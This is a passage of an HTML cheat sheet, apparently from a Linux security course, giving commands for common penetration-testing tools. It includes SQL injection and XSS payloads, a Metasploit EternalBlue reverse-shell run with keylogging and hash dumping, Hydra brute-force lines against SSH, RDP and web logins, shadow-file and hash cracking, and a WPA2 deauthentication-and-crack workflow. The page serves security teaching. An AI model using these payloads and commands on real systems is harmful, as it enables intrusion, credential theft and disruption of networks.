                           <span class="c"># Live capture on eth0</span>
<span class="cmd">tshark</span> <span class="fl">-i</span> eth0 <span class="fl">-w</span> capture.pcap             <span class="c"># Save to file</span>
<span class="cmd">tshark</span> <span class="fl">-r</span> capture.pcap                      <span class="c"># Read saved capture</span>
<span class="cmd">tshark</span> <span class="fl">-i</span> eth0 <span class="fl">-f</span> <span class="str">"port 80"</span>               <span class="c"># Capture filter — HTTP only</span>
<span class="cmd">tshark</span> <span class="fl">-r</span> file.pcap <span class="fl">-Y</span> <span class="str">"http"</span>             <span class="c"># Display filter — HTTP packets</span>
<span class="cmd">tshark</span> <span class="fl">-r</span> file.pcap <span class="fl">-T fields -e</span> <span class="kw">http.host</span> <span class="c"># Extract HTTP hostnames</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">DISPLAY FILTERS (GUI)</span>
      </div>
      <pre><span class="kw">http</span>                               <span class="c"># All HTTP traffic</span>
<span class="kw">http.request.method</span> <span class="op">==</span> <span class="str">"POST"</span>     <span class="c"># Only POST requests</span>
<span class="kw">ip.addr</span> <span class="op">==</span> <span class="val">192.168.1.10</span>          <span class="c"># Traffic to/from specific IP</span>
<span class="kw">ip.src</span> <span class="op">==</span> <span class="val">192.168.1.10</span>           <span class="c"># Traffic FROM specific IP</span>
<span class="kw">tcp.port</span> <span class="op">==</span> <span class="val">443</span>                   <span class="c"># HTTPS traffic</span>
<span class="kw">dns</span>                                <span class="c"># All DNS queries</span>
<span class="kw">tcp.flags.syn</span> <span class="op">==</span> <span class="val">1</span>               <span class="c"># SYN packets (connection attempts)</span>
<span class="op">!</span><span class="str">(arp or dns or icmp)</span>            <span class="c"># Exclude noise</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">DECODE BASE64 CREDENTIALS</span>
      </div>
      <pre><span class="c"># Filter: http.authorization  →  look for Basic Auth</span>
<span class="c"># Base64 decode any encoded credentials:</span>
<span class="cmd">echo</span> <span class="str">"dXNlcjpwYXNz"</span> <span class="op">|</span> <span class="cmd">base64</span> <span class="fl">-d</span>   <span class="c"># Reveals → user:pass</span></pre>
    </div>
  </section>

  <!-- ══════════════ 03 · BURP SUITE ══════════════ -->
  <section class="tool-section" id="burpsuite">
    <div class="tool-header">
      <span class="tool-number">03</span>
      <span class="tool-icon">🕷️</span>
      <span class="tool-name">BURP <span>SUITE</span></span>
      <span class="tool-badge badge-web">WEB APP</span>
    </div>
    <div class="install-line">INSTALL → <code>portswigger.net</code> (Community Edition is free)</div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">SETUP — PROXY INTERCEPTION</span>
      </div>
      <pre><span class="c"># 1. Launch Burp → Proxy tab → Intercept: ON</span>
<span class="c"># 2. Set browser proxy → 127.0.0.1:8080</span>
<span class="c"># 3. Install Burp CA cert for HTTPS:</span>
<span class="c">#    Navigate to http://burpsuite → Download certificate</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">INTRUDER — ATTACK TYPES</span>
      </div>
      <pre><span class="kw">Sniper</span>      <span class="op">→</span> One payload position, iterate one list
<span class="kw">Battering</span>   <span class="op">→</span> One position, all combos from one list
<span class="kw">Cluster</span>     <span class="op">→</span> Multiple positions simultaneously
<span class="kw">Pitchfork</span>   <span class="op">→</span> Multiple positions, multiple lists <span class="c">(username:password)</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">COMMON PAYLOADS</span>
      </div>
      <pre><span class="c"># ── SQL INJECTION ──────────────────────────────────</span>
id=<span class="val">1</span><span class="op">'</span>
id=<span class="val">1 OR 1</span><span class="op">=</span><span class="val">1</span><span class="op">--</span>
id=<span class="val">1</span><span class="op">;</span> <span class="kw">DROP TABLE</span> users<span class="op">--</span>

<span class="c"># ── XSS ────────────────────────────────────────────</span>
<span class="op">&lt;</span>script<span class="op">&gt;</span>alert(1)<span class="op">&lt;</span>/script<span class="op">&gt;</span>
<span class="str">"&gt;</span><span class="op">&lt;</span>img src<span class="op">=</span>x onerror<span class="op">=</span>alert(1)<span class="op">&gt;</span>

<span class="c"># ── AUTH BYPASS ─────────────────────────────────────</span>
admin=<span class="op">false</span>  <span class="op">→</span>  admin=<span class="val">true</span>
role=<span class="op">user</span>    <span class="op">→</span>  role=<span class="val">admin</span></pre>
    </div>
  </section>

  <!-- ══════════════ 04 · METASPLOIT ══════════════ -->
  <section class="tool-section" id="metasploit">
    <div class="tool-header">
      <span class="tool-number">04</span>
      <span class="tool-icon">💀</span>
      <span class="tool-name">META<span>SPLOIT</span></span>
      <span class="tool-badge badge-exploit">EXPLOIT</span>
    </div>
    <div class="install-line">INSTALL → <code>sudo apt install metasploit-framework</code> (pre-installed on Kali)</div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">SEARCH & SELECT</span>
      </div>
      <pre><span class="cmd">msfconsole</span>                                  <span class="c"># Launch Metasploit</span>
<span class="cmd">search</span> <span class="str">eternalblue</span>                          <span class="c"># Search by name/CVE</span>
<span class="cmd">search</span> type<span class="op">:</span>exploit platform<span class="op">:</span>windows       <span class="c"># Filter results</span>
<span class="cmd">use</span> exploit/windows/smb/ms17_010_eternalblue <span class="c"># Select module</span>
<span class="cmd">info</span>                                         <span class="c"># Full module info</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">CONFIGURE & RUN</span>
      </div>
      <pre><span class="cmd">show options</span>                                       <span class="c"># List required options</span>
<span class="cmd">set</span> <span class="kw">RHOSTS</span>  <span class="val">192.168.1.10</span>                          <span class="c"># Target IP</span>
<span class="cmd">set</span> <span class="kw">RPORT</span>   <span class="val">445</span>                                    <span class="c"># Target port</span>
<span class="cmd">set</span> <span class="kw">LHOST</span>   <span class="val">192.168.1.5</span>                            <span class="c"># Your listener IP</span>
<span class="cmd">set</span> <span class="kw">LPORT</span>   <span class="val">4444</span>                                   <span class="c"># Listener port</span>
<span class="cmd">set</span> <span class="kw">PAYLOAD</span> <span class="val">windows/x64/meterpreter/reverse_tcp</span>   <span class="c"># Payload</span>
<span class="cmd">check</span>                                               <span class="c"># Verify vulnerability</span>
<span class="cmd">run</span>                                                 <span class="c"># Fire!</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">METERPRETER — POST EXPLOITATION</span>
      </div>
      <pre><span class="cmd">sysinfo</span>              <span class="c"># System info</span>
<span class="cmd">getuid</span>               <span class="c"># Current user</span>
<span class="cmd">getsystem</span>            <span class="c"># Attempt privilege escalation</span>
<span class="cmd">hashdump</span>             <span class="c"># Dump password hashes</span>
<span class="cmd">ps</span>                   <span class="c"># List processes</span>
<span class="cmd">migrate</span> <span class="op">&lt;</span>PID<span class="op">&gt;</span>         <span class="c"># Migrate to another process</span>
<span class="cmd">shell</span>                <span class="c"># Drop to system shell</span>
<span class="cmd">keyscan_start</span>        <span class="c"># Start keylogger</span>
<span class="cmd">screenshot</span>           <span class="c"># Take screenshot</span>
<span class="cmd">upload</span>   <span class="fl">/local</span> <span class="fl">/remote</span>  <span class="c"># Upload file</span>
<span class="cmd">download</span> <span class="fl">/remote</span> <span class="fl">/local</span>  <span class="c"># Download file</span></pre>
    </div>
  </section>

  <!-- ══════════════ 05 · HYDRA ══════════════ -->
  <section class="tool-section" id="hydra">
    <div class="tool-header">
      <span class="tool-number">05</span>
      <span class="tool-icon">🔑</span>
      <span class="tool-name">HY<span>DRA</span></span>
      <span class="tool-badge badge-exploit">BRUTE FORCE</span>
    </div>
    <div class="install-line">INSTALL → <code>sudo apt install hydra</code></div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">COMMON PROTOCOLS</span>
      </div>
      <pre><span class="c"># ── SSH ───────────────────────────────────────────────────</span>
<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> /usr/share/wordlists/rockyou.txt ssh<span class="op">://</span><span class="val">192.168.1.10</span>
<span class="cmd">hydra</span> <span class="fl">-L</span> users.txt <span class="fl">-P</span> passwords.txt ssh<span class="op">://</span><span class="val">192.168.1.10</span>
<span class="cmd">hydra</span> <span class="fl">-l</span> root <span class="fl">-P</span> rockyou.txt <span class="fl">-t</span> <span class="val">4</span> ssh<span class="op">://</span><span class="val">192.168.1.10</span>

<span class="c"># ── FTP ───────────────────────────────────────────────────</span>
<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt ftp<span class="op">://</span><span class="val">192.168.1.10</span>

<span class="c"># ── HTTP FORM LOGIN ───────────────────────────────────────</span>
<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt <span class="val">192.168.1.10</span> http-post-form \
  <span class="str">"/login:username=^USER^&password=^PASS^:Invalid credentials"</span>

<span class="c"># ── HTTP BASIC AUTH ───────────────────────────────────────</span>
<span class="cmd">hydra</span> <span class="fl">-l</span> admin <span class="fl">-P</span> rockyou.txt http-get<span class="op">://</span><span class="val">192.168.1.10/admin</span>

<span class="c"># ── RDP ───────────────────────────────────────────────────</span>
<span class="cmd">hydra</span> <span class="fl">-l</span> administrator <span class="fl">-P</span> rockyou.txt rdp<span class="op">://</span><span class="val">192.168.1.10</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">KEY FLAGS REFERENCE</span>
      </div>
      <pre><span class="fl">-l</span>   Single username          <span class="fl">-L</span>   Username list file
<span class="fl">-p</span>   Single password           <span class="fl">-P</span>   Password list file
<span class="fl">-t</span>   Parallel threads (16)     <span class="fl">-V</span>   Verbose — show each attempt
<span class="fl">-f</span>   Stop after first hit      <span class="fl">-o</span>   Save results to file</pre>
    </div>
  </section>

  <!-- ══════════════ 06 · JOHN ══════════════ -->
  <section class="tool-section" id="john">
    <div class="tool-header">
      <span class="tool-number">06</span>
      <span class="tool-icon">🔓</span>
      <span class="tool-name">JOHN THE <span>RIPPER</span></span>
      <span class="tool-badge badge-hash">HASH CRACKER</span>
    </div>
    <div class="install-line">INSTALL → <code>sudo apt install john</code></div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">CRACKING HASHES</span>
      </div>
      <pre><span class="cmd">john</span> hashes.txt                              <span class="c"># Auto-detect format</span>
<span class="cmd">john</span> <span class="fl">--wordlist=</span>/usr/share/wordlists/rockyou.txt hashes.txt

<span class="c"># Format-specific</span>
<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">md5</span>    hashes.txt
<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">sha256</span> hashes.txt
<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">bcrypt</span> hashes.txt
<span class="cmd">john</span> <span class="fl">--format=</span><span class="kw">NT</span>     hashes.txt  <span class="c"># Windows NTLM</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">LINUX / ZIP / RAR</span>
      </div>
      <pre><span class="c"># ── Linux Shadow File ──────────────────────</span>
<span class="cmd">unshadow</span> /etc/passwd /etc/shadow <span class="op">&gt;</span> combined.txt
<span class="cmd">john</span> combined.txt

<span class="c"># ── Protected ZIP ──────────────────────────</span>
<span class="cmd">zip2john</span> protected.zip <span class="op">&gt;</span> zip.hash
<span class="cmd">john</span> zip.hash <span class="fl">--wordlist=</span>rockyou.txt

<span class="c"># ── Protected RAR ──────────────────────────</span>
<span class="cmd">rar2john</span> protected.rar <span class="op">&gt;</span> rar.hash
<span class="cmd">john</span> rar.hash <span class="fl">--wordlist=</span>rockyou.txt

<span class="c"># ── Show results ───────────────────────────</span>
<span class="cmd">john</span> <span class="fl">--show</span> hashes.txt

<span class="c"># ── Mutation rules ─────────────────────────</span>
<span class="cmd">john</span> <span class="fl">--wordlist=</span>rockyou.txt <span class="fl">--rules</span> hashes.txt</pre>
    </div>
  </section>

  <!-- ══════════════ 07 · HASHCAT ══════════════ -->
  <section class="tool-section" id="hashcat">
    <div class="tool-header">
      <span class="tool-number">07</span>
      <span class="tool-icon">⚡</span>
      <span class="tool-name">HASH<span>CAT</span></span>
      <span class="tool-badge badge-hash">GPU CRACKER</span>
    </div>
    <div class="install-line">INSTALL → <code>sudo apt install hashcat</code></div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">HASH MODES (-m) REFERENCE</span>
      </div>
      <pre><span class="fl">-m</span> <span class="val">0</span>      MD5
<span class="fl">-m</span> <span class="val">100</span>    SHA1
<span class="fl">-m</span> <span class="val">1400</span>   SHA-256
<span class="fl">-m</span> <span class="val">1800</span>   sha512crypt  <span class="c">(Linux $6$)</span>
<span class="fl">-m</span> <span class="val">1000</span>   NTLM         <span class="c">(Windows)</span>
<span class="fl">-m</span> <span class="val">3200</span>   bcrypt
<span class="fl">-m</span> <span class="val">22000</span>  WPA2         <span class="c">(WiFi)</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">ATTACK MODES (-a)</span>
      </div>
      <pre><span class="c"># Dictionary attack</span>
<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span>    <span class="fl">-a</span> <span class="val">0</span> hash.txt rockyou.txt      <span class="c"># MD5 + wordlist</span>
<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">1000</span> <span class="fl">-a</span> <span class="val">0</span> ntlm.txt rockyou.txt     <span class="c"># Windows NTLM</span>

<span class="c"># Brute force with mask</span>
<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> <span class="fl">-a</span> <span class="val">3</span> hash.txt <span class="str">?d?d?d?d</span>          <span class="c"># 4-digit PIN</span>
<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> <span class="fl">-a</span> <span class="val">3</span> hash.txt <span class="str">?u?l?l?l?d?d?d?d</span>  <span class="c"># Upper+lower+digits</span>

<span class="c"># Mask charset key:</span>
<span class="c"># ?l = lowercase   ?u = uppercase   ?d = digit   ?s = special   ?a = all</span>

<span class="c"># With rules</span>
<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> <span class="fl">-a</span> <span class="val">0</span> hash.txt rockyou.txt <span class="fl">-r</span> best64.rule

<span class="c"># Show results</span>
<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">0</span> hash.txt <span class="fl">--show</span></pre>
    </div>
  </section>

  <!-- ══════════════ 08 · AIRCRACK ══════════════ -->
  <section class="tool-section" id="aircrack">
    <div class="tool-header">
      <span class="tool-number">08</span>
      <span class="tool-icon">📶</span>
      <span class="tool-name">AIRCRACK<span>-NG</span></span>
      <span class="tool-badge badge-wifi">WIRELESS</span>
    </div>
    <div class="install-line">INSTALL → <code>sudo apt install aircrack-ng</code></div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">FULL WORKFLOW — WPA2 CAPTURE</span>
      </div>
      <pre><span class="c"># 1. Enable monitor mode</span>
<span class="cmd">sudo airmon-ng check kill</span>       <span class="c"># Kill interfering processes</span>
<span class="cmd">sudo airmon-ng start</span> wlan0      <span class="c"># → wlan0mon</span>

<span class="c"># 2. Scan for networks</span>
<span class="cmd">sudo airodump-ng</span> wlan0mon

<span class="c"># 3. Target & capture handshake</span>
<span class="cmd">sudo airodump-ng</span> <span class="fl">-c</span> <span class="val">6</span> <span class="fl">--bssid</span> <span class="val">AA:BB:CC:DD:EE:FF</span> <span class="fl">-w</span> capture wlan0mon

<span class="c"># 4. Force handshake via deauth</span>
<span class="cmd">sudo aireplay-ng</span> <span class="fl">-0</span> <span class="val">10</span> <span class="fl">-a</span> <span class="val">AA:BB:CC:DD:EE:FF</span> wlan0mon

<span class="c"># 5. Crack the handshake</span>
<span class="cmd">aircrack-ng</span> <span class="fl">-w</span> rockyou.txt <span class="fl">-b</span> <span class="val">AA:BB:CC:DD:EE:FF</span> capture-01.cap

<span class="c"># 6. Stop monitor mode</span>
<span class="cmd">sudo airmon-ng stop</span> wlan0mon</pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">⚡ FASTER — HASHCAT + HCXTOOLS</span>
      </div>
      <pre><span class="cmd">hcxdumptool</span> <span class="fl">-i</span> wlan0mon <span class="fl">-o</span> capture.pcapng <span class="fl">--enable-status=</span><span class="val">1</span>
<span class="cmd">hcxpcapngtool</span> <span class="fl">-o</span> hash.hc22000 capture.pcapng
<span class="cmd">hashcat</span> <span class="fl">-m</span> <span class="val">22000</span> hash.hc22000 rockyou.txt</pre>
    </div>
  </section>

  <!-- ══════════════ 09 · NIKTO ══════════════ -->
  <section class="tool-section" id="nikto">
    <div class="tool-header">
      <span class="tool-number">09</span>
      <span class="tool-icon">🕸️</span>
      <span class="tool-name">NIK<span>TO</span></span>
      <span class="tool-badge badge-web">WEB SCANNER</span>
    </div>
    <div class="install-line">INSTALL → <code>sudo apt install nikto</code></div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">SCANNING</span>
      </div>
      <pre><span class="cmd">nikto</span> <span class="fl">-h</span> http<span class="op">://</span><span class="val">192.168.1.10</span>                          <span class="c"># HTTP target</span>
<span class="cmd">nikto</span> <span class="fl">-h</span> https<span class="op">://</span><span class="val">192.168.1.10</span>                         <span class="c"># HTTPS target</span>
<span class="cmd">nikto</span> <span class="fl">-h</span> <span class="val">192.168.1.10</span> <span class="fl">-port</span> <span class="val">8080</span>                     <span class="c"># Non-default port</span>
<span class="cmd">nikto</span> <span class="fl">-h</span> <span class="val">192.168.1.10</span> <span class="fl">-o</span> report.html <span class="fl">-Format</span> htm      <span class="c"># HTML report</span>
<span class="cmd">nikto</span> <span class="fl">-h</span> <span class="val">192.168.1.10</span> <span class="fl">-useproxy</span> http<span class="op">://</span>127.0.0.1:8080 <span class="c"># Through Burp</span></pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">TUNING FLAGS</span>
      </div>
      <pre><span class="fl">-Tuning 1</span>   XSS tests only
<span class="fl">-Tuning 4</span>   Injection tests only
<span class="fl">-ssl</span>        Force SSL

<span class="c"># Nikto checks for:</span>
<span class="op">→</span> Outdated software versions
<span class="op">→</span> Dangerous HTTP methods  <span class="c">(PUT, DELETE)</span>
<span class="op">→</span> Default credentials
<span class="op">→</span> Common exposed paths    <span class="c">(/admin, /backup, /config)</span>
<span class="op">→</span> Missing security headers</pre>
    </div>
  </section>

  <!-- ══════════════ 10 · GOBUSTER ══════════════ -->
  <section class="tool-section" id="gobuster">
    <div class="tool-header">
      <span class="tool-number">10</span>
      <span class="tool-icon">📂</span>
      <span class="tool-name">GOBUS<span>TER</span></span>
      <span class="tool-badge badge-web">FUZZER</span>
    </div>
    <div class="install-line">INSTALL → <code>sudo apt install gobuster</code></div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">DIRECTORY & SUBDOMAIN ENUM</span>
      </div>
      <pre><span class="c"># Directory brute force</span>
<span class="cmd">gobuster</span> dir <span class="fl">-u</span> http<span class="op">://</span><span class="val">192.168.1.10</span> <span class="fl">-w</span> /usr/share/wordlists/dirb/common.txt
<span class="cmd">gobuster</span> dir <span class="fl">-u</span> http<span class="op">://</span><span class="val">192.168.1.10</span> <span class="fl">-w</span> common.txt <span class="fl">-x</span> php,html,txt,bak

<span class="c"># Subdomain enumeration</span>
<span class="cmd">gobuster</span> dns <span class="fl">-d</span> example.com <span class="fl">-w</span> subdomains-top1million-5000.txt

<span class="c"># VHost discovery</span>
<span class="cmd">gobuster</span> vhost <span class="fl">-u</span> http<span class="op">://</span>example.com <span class="fl">-w</span> subdomains.txt</pre>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">KEY FLAGS</span>
      </div>
      <pre><span class="fl">-u</span>   Target URL              <span class="fl">-w</span>   Wordlist path
<span class="fl">-x</span>   File extensions         <span class="fl">-t</span>   Threads (default 10, use 50+)
<span class="fl">-o</span>   Output file             <span class="fl">-k</span>   Skip TLS verification
<span class="fl">-s</span>   Show status codes only  <span class="fl">-b</span>   Blacklist codes: <span class="str">-b 404,403</span>

<span class="c"># Install SecLists (essential wordlists)</span>
<span class="cmd">sudo apt install seclists</span></pre>
    </div>
  </section>

  <!-- ══════════════ SUMMARY ══════════════ -->
  <section class="tool-section" id="summary">
    <div class="tool-header">
      <span class="tool-number">★</span>
      <span class="tool-icon">📋</span>
      <span class="tool-name">QUICK <span>REFERENCE</span></span>
    </div>

    <div class="code-block">
      <div class="code-header">
        <span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span>
        <span class="code-label">TOOL CHEATSHEET SUMMARY</span>
      </div>
      <table class="summary-table" style="width:100%">
        <thead>
          <tr>
            <th>TOOL</th>
            <th>CATEGORY</th>
            <th>PRIMARY USE</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td class="tool-col">nmap</td>
            <td><span class="tool-badge badge-net cat-pill">NETWORK</span></td>
            <td>Network/port scanning, service & OS detection</td>
          </tr>
          <tr>
            <td class="tool-col">wireshark</td>
            <td><span class="tool-badge badge-net cat-pill">NETWORK</span></td>
            <td>Packet capture, traffic analysis, credential sniffing</td>
          </tr>
          <tr>
            <td class="tool-col">burpsuite</td>
            <td><span class="tool-badge badge-web cat-pill">WEB APP</span></td>
            <td>Web app testing, request interception & modification</td>
          </tr>
          <tr>
            <td class="tool-col">metasploit</td>
            <td><span class="tool-badge badge-exploit cat-pill">EXPLOIT</span></td>
            <td>Exploitation framework, post-exploitation, pivoting</td>
          </tr>
          <tr>
            <td class="tool-col">hydra</td>
            <td><span class="tool-badge badge-exploit cat-pill">BRUTE FORCE</span></td>
            <td>Online password brute forcing (SSH, FTP, HTTP…)</td>
          </tr>
          <tr>
            <td class="tool-col">john</td>
            <td><span class="tool-badge badge-hash cat-pill">HASH</span></td>
            <td>Offline hash cracking, CPU — zip/rar/shadow files</td>
          </tr>
          <tr>
            <td class="tool-col">hashcat</td>
            <td><span class="tool-badge badge-hash cat-pill">HASH</span></td>
            <td>Offline hash cracking, GPU-accelerated, masks & rules</td>
          </tr>
          <tr>
            <td class="tool-col">aircrack-ng</td>
            <td><span class="tool-badge badge-wifi cat-pill">WIRELESS</span></td>
            <td>WiFi security testing, WPA2 handshake capture & crack</td>
          </tr>
          <tr>
            <td class="tool-col">nikto</td>
            <td><span class="tool-badge badge-web cat-pill">WEB SCAN</span></td>
            <td>Web server vulnerability scanning, misconfigurations</td>
          </tr>
          <tr>
            <td class="tool-col">gobuster</td>
            <td><span class="tool-badge badge-web cat-pill">FUZZER</span></td>
            <td>Directory brute force, subdomain & vhost enumeration</td>
          </tr>
        </tbody>
      </table>
    </div>
  </section>

</div>

<footer class="footer">
  <span>"</span>A tool is only as good as the person wielding it.<span>"</span><br>
  Understand what each command does — never blindly copy.<br><br>
  Part of the Linux Cybersec Course · Use responsibly
</footer>

</body>
</html>
